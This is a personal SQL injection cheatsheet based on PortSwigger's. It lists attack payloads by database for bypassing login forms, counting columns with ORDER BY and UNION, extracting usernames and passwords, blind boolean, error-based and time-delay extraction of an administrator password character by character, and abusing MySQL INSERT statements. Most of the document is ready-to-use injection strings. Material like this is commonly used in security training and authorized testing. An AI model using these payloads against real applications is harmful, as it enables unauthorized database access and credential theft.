# Personnal cheatsheet

The following cheatsheet is mainly inspired by portswigger cheatsheet.

https://portswigger.net/web-security/sql-injection/cheat-sheet


# SQLi methodology : <br>
- find the number of column <br>
- type of data in each column<br>
- type of db (oracle,MySql, postgresql , ...) and version <br>
- enumerate the db<br>
<br>

# summary : 
* [sql injection basic](#sql-injection-basic)
    * [retieve information](#retrive-information-)
    * [bypass login form](#bypass-login-form-)
    * [enumerate columns](#enumerate-columns-)
    * [found specific data type in a column](#found-a-specific-data-type-in-a-column-)
* [retrieve multiple values using single columns](#retrive-multiple-values-using-a-single-colummns)
    * [oracle retrieve multiple values using single columns](#oracle-)
    * [mysql/sqlite retrieve multiple values using single columns](#mysqlsqllite)
    * [postgresql retrieve multiple values using single columns](#postgresql)
* [information on the database](#information-on-the-database)
    * [enumerate version](#enumerate-version)
* [manipulate query to find the database](#manipulate-query-to-find-the-database)
    * [manipulate oracle query](#manipulate-oracle-query)
    * [manipulate mysql query](#manipulate-mysql-query)
* [retrieve  content from the database ](#retrieve-content-of-database-execept-oracle-db)
    * [retrieve  content from oracle database](#retrieve-content-from-oracle-db-)
    * [retrieve  content from the sqlite databse](#retrieve-content-from-sqlite-db)
* [Blind sql injection](#blind-sqli)
    * [Blind sql injection trigger by condition response](#exploiting-blind-sqli-by-triggering-condition-response)
    * [Blind sql injection using bruteforce with substring()](#bruteforce)
    * [Blind sql injection using syntax error](#inducing-conditional--error)
    * [Blind sql injection time based ](#blind-sql-time-based)
    * [Blind sql injection using conditional time delays](#blindsqli-with-conditional-time-delays-in-order-to-leak-info)
* [sql injection using mysql inset queries](#particularity-of-mysql-insert-queries-)
* [more tricks](#trick)
* [sources](#source)


## Sql injection basic:

##### retrive information : 

```sql
--without any sanitization and using single quote

ex: http://link/?category=bike 

payload :  asdf' or 1=1 --


```

##### bypass login form : 

```sql
--without any sanitization and using single quote

username : administrator' --
password : asdf

```

##### enumerate columns :  

 use  UNION operator which allow us to make a second sql query.

-> prerequisite :<br>
    **1-same number of columns is return**<br>
    **2-compatibility in the return data type beetween queries**


-> First we need to enumerate the number of column using 'order by' clause : 

normal usage : 
```sql
order by ASC

order by DESC 

order by column_name

order by column_name ASC , column_name2 DESC

```


But the order by clause allows us to us index and enumerate the number of columns

 
```sql
'  order by 1 --  
'  order by 2 --
    etc...
```
Based on the behaviour of the application we can detect the number of column.

An other method is to use union operator to enumerate the number of column: 
```sql
' union select null --
' union select null,null --
' union select null,null,null --
...

```
**usage of null is preferable** than other data type because
null is convertible to common data type like integer, string ..



#### found a specific data type in a column :

once  we enumerate the number of column with the previous technique

we can replace null by a string for exemple : 

```sql
' union select 'ab', null ,null --
' union select  null, 'ab' ,null --
' union select  null, null ,'ab' --
...

```
Based on the behaviour of the page we can find the data type of a specific column.




### Retrive multiple values using a single colummns 

#### **ORACLE** : 

with the || sequence , this pipe operateur is use for concatenation


```sql
' union select username || '~'|| password from users --
```

username and password will be retrieve separated by ~


#### **MySql/sqlLite**: 

```sql
' union select group_concat(password) from users --
```
The operator group_concat() can also be use in sqlite database.

#### **Postgresql**: 

```sql
' union select string_agg(password,(select chr(95))) from users --
```
chr(95) = '-'<br>
password will be printed separated by '-'


## Information on the Database 


### enumerate version 

```sql
Microsoft, MySQL	SELECT @@version
Oracle	SELECT * FROM v$version
PostgreSQL	SELECT version()
sqlite SELECT sqlite_version()
```
If you can't use version in order to find the database you can  use the following tricks to find it.

### manipulate query to find the database

#### manipulate oracle query

In a oracle db, if we are using a union query injection we need to use a valid table name.


ex: 
SELECT null,null,... FROM v$instance  // in order to enumerate the number of column 

SELECT banner,null.. FROM v$instance // to enumerate the version of the db

### manipulate MySQL query

comment :  "-- " don't forget the space after the '--'

 

In order to enumerate the number of column: 

'union select null,null, ....   -- (avec un espace ?? la toute fin)   


datatype of the columns : 

```sql
' union select 'a', null , ... -- 
' union select null, 'a', ...  --
```

version : 

```sql
' union select null, version,  ...   --    
```
(if the data type of the second column is string)


### retrieve content of database (execept Oracle db): 


Table name : 
```sql
SELECT table_name FROM information_schema.tables
```
Once we found an interesting table name we can enumerate the associated columns : 

(for the sake of the example our interesting table is called 'admin_users')
```sql
SELECT column_name FROM information_schema.columns WHERE table_name = 'admin_users'
```




### retrieve content from oracle db : 

enumerate the version: 
```sql
' union select null,null,... from v$version --
```

enumerate table name: 

```sql
SELECT table_name,.. FROM all_tables --
```
enumerate column name for a specific table:

```sql
SELECT column_name,... FROM all_tab_columns WHERE table_name = 'admin_users' --
```

retrieve information:


```sql
SELECT null , username || '-'??|| password  FROM admin_users --
```

### retrieve content from sqlite db:

(in our example the orignal table where the injection happen got 3 columns) 
enumerate the version

```sql
union select sqlite_version(),null,null  --
```
enumerate table name:

```sql
union select group_concat(tbl_name),null,null from sqlite_master where type='table'  --
```
enumerate column name:

```sql
union select  group_concat(sql)null,null from sqlite_master where tbl_name='YOURTABLE_NAME'
```

## Blind sqli 


sqli with union may sometimes not work 


### exploiting blind sqli by triggering condition response



sqli in in the HTTP header: 

cookie: some_cookie=AZERTY

```sql
select some_cookie from cookie_tab where some_cookie='AZERTY' 
```
The query is vulnerable to sqli but there  wouldn't be any output in the client side if the query crash.

But the behaviour of the application may change : 

ex: 

good cookie => "Welcome"

bad cookie => the welcome messsage is not printed

And using conditionnal operator we can understand more about the query:

```sql
AZERTY' AND '1'='1   => Welcome
AZERTY' AND '1'='2   => the welcome messsage is not printed
```



Suppose we found the name of a table ex 'Users' and this table got
2 columns called 'username' and 'password'.


And we know that there is an admin account called 'Administrator'


cookie: some_cookie=AZERTY

```sql
AZERTY' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
```

supppose it returns "Welcome"


```sql
AZERTY' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
```
supppose it don"t returns Welcome


we know that the first letter of the password is :

  m < password[0] < t 



###  bruteforce

Bruteforce is possible: 


```sql
AZERTY' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
SUBSTRING(string,start,end)

We can bruteforce each characters with this technique : 

- SUBSTRING(string,1,1)
- SUBSTRING(string,1,2)
- ....
- SUBSTRING(string,1,n)



## Inducing conditional  error

Idea: **generate a sql syntax error and not a logical one in order to play with the behaviour of the application**

 

ex : 

```sql 
azerty' --   => application response with 'Welcome' 

azerty '' -- => application doest not response with 'Welcome' 
```


### usage of  CASE
```sql
xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a    equivalent to  xyz' and 'a'='a
```

```sql
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a    equivalent to   xyz' and 1/0='a   => not the normal behaviour of the app

```

### retrive data using this technique:  


```sql
xyz' AND (SELECT CASE WHEN (AND SUBSTRING(Password,1,1) ='m') THEN 1/0 ELSE 'a' END FROM Users where username = 'administrator')='a
```
 


## blind sql time based

when there isn't any error printed due to syntax error.

```sql
Oracle	dbms_pipe.receive_message(('a'),10)
Microsoft	WAITFOR DELAY '0:0:10'
PostgreSQL	SELECT pg_sleep(10)
MySQL	SELECT SLEEP(10)
```



## blindsqli with conditional time delays in order to leak info 



```sql
Oracle	    SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
Microsoft	IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
PostgreSQL	SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
MySQL	    SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')

```


## particularity of mysql insert queries : 

```sql
insert into myTable(a,b,c) values (1,2,3) (4,5,6)  .....
```
We can have an sql injection in a insert query.

If the application use insert and you can control a filed that can be reflected, you can abuse of insert
(the application should use Mysql)

normal usage :

username: jeyanthan<br>
password: hello<br>
comment: nothing<br>


```sql
insert into users(username,password,comment) values('jeyanthan','hello','nothing');
```


not normal usage :

username: jeyanthan','hello','nothing'), ('jeyanthan1', 'hello', (select @@version)), ('ratz', 'hello', 'one piece <br>
password: hello

```sql
insert into users(username,password,comment) values('jeyanthan','hello','nothing') , ('jeyanthan1', 'hello', (select @@version)), ('ratz', 'hello', 'one piece'); 
```

Once connected as 'jeyanthan1' the version of the Mysql db should be reflected.


#### trick 

injection parameter : <br>
-try to end the query with --, #, -- (with the additional space)<br>
-if the parameter use a string maybe  'union'  operator can be use to chain a second query.<br>
 You can also use '||' (pipe) operator in order to concatenate the result of your query in the original one.<br>
 You can also exfiltrate informations directly using 'and' :   ' and substring(password,1,1)='a' --<br>
-if the parameter use an integer either 'or' and ';' may work ! <br>



# Source: 

https://portswigger.net/web-security/sql-injection/cheat-sheet


